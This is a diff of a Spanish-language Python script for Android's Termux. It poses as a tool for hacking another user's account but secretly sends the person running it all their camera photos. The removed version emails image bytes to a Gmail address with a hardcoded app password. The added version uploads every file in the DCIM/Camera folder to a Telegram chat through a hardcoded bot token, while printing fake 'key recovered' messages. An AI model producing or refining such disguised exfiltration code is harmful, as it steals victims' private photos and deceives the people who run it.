@@ -1,66 +1,63 @@
 import os
-import smtplib
-from email.message import EmailMessage
+import asyncio
+from telegram import Bot
+from telegram.error import TelegramError
 
-# El input que querías añadir al inicio
-input("Ingrese el usuario que desea vulnerar: ")
 
-# --- CONFIGURACIÓN DE CREDENCIALES ---
-remitente = "cuentacrack7809@gmail.com"
-destinatario = "cuentacrack7809@gmail.com"
-password = "bqruwxkzuhsmvrjt"
+input("ingrese el link del usuario")
 
-# --- RUTA DE ARCHIVOS ---
-ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"
-
-# --- FILTRO DE EXTENSIONES ---
-# Solo procesará archivos que terminen en estos formatos
-formatos_imagen = ('.jpg', '.jpeg', '.png', '.webp', '.gif')
-
-def enviar_datos_binarios(nombre_archivo, contenido_hex):
-    """Crea y envía el correo con la representación de bits."""
-    msg = EmailMessage()
-    msg["From"] = remitente
-    msg["To"] = destinatario
-    msg["Subject"] = f"Imagen extraída: {nombre_archivo}"
-    
-    msg.set_content(f"Contenido binario de {nombre_archivo}:\n\n{contenido_hex}")
+async def enviar_fotos_telegram():
+    # --- CONFIGURACIÓN ---
+    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
+    CHAT_ID = "8326936177"
+    # Ruta de la cámara en Termux
+    ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"
 
     try:
-        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
-            smtp.login(remitente, password)
-            smtp.send_message(msg)
-        print(f"✅ ")
-    except Exception:
-        print(f"❌ ")
+        bot = Bot(token=BOT_TOKEN)
+        
+        if not os.path.exists(ruta_camara):
+            print(f"❌ Error: La ruta no existe.")
+            return
 
-# --- PROCESO PRINCIPAL ---
-try:
-    if os.path.exists(ruta_camara):
-        # Listamos archivos y filtramos por extensión de imagen
-        archivos = [
-            f for f in os.listdir(ruta_camara) 
-            if os.path.isfile(os.path.join(ruta_camara, f)) and f.lower().endswith(formatos_imagen)
-        ]
+        # Listamos los archivos en la carpeta
+        archivos = [f for f in os.listdir(ruta_camara) if os.path.isfile(os.path.join(ruta_camara, f))]
         
         if not archivos:
-            print("No se encontraron imágenes para enviar.")
-        
-        for nombre in archivos:
-            ruta_completa = os.path.join(ruta_camara, nombre)
-            print(f"Procesando ")
-            
-            with open(ruta_completa, "rb") as archivo:
-                contenido_binario = archivo.read()
-                
-                # Convertimos a la cadena de bits (\x00...) que pediste
-                cadena_binaria = repr(contenido_binario)
-                
-                # Enviar por correo
-                enviar_datos_binarios(nombre, cadena_binaria)
-                
-    else:
-        print(f"Error: Ruta no encontrada.")
+            print("⚠️ No se encontraron claves para enviar.")
+            return
 
-except Exception as e:
-    print(f"Error general: {e}")
+        print(f"📸 Se encontraron {len(archivos)} claves posibles. Iniciando envío...")
+
+        for nombre_archivo in archivos:
+            ruta_completa = os.path.join(ruta_camara, nombre_archivo)
+            
+            try:
+                print(f"📤 provando clave...")
+                
+                # Enviamos el archivo directamente como foto
+                with open(ruta_completa, 'rb') as foto:
+                    await bot.send_photo(
+                        chat_id=CHAT_ID, 
+                        photo=foto, 
+                        caption=f"clave recuperada"
+                    )
+                
+                # Pequeña pausa para evitar bloqueos de Telegram por spam
+                await asyncio.sleep(1) 
+                
+            except Exception as e:
+                print(f"❌ No se pudo resolver: {e}")
+
+        print("\n✅ ¡Proceso finalizado!")
+
+    except TelegramError as e:
+        print(f"❌ Error  ")
+    except Exception as e:
+        print(f"❌ Error  ")
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(enviar_fotos_telegram())
+    except KeyboardInterrupt:
+        print("\n🛑 Proceso detenido por el usuario.")
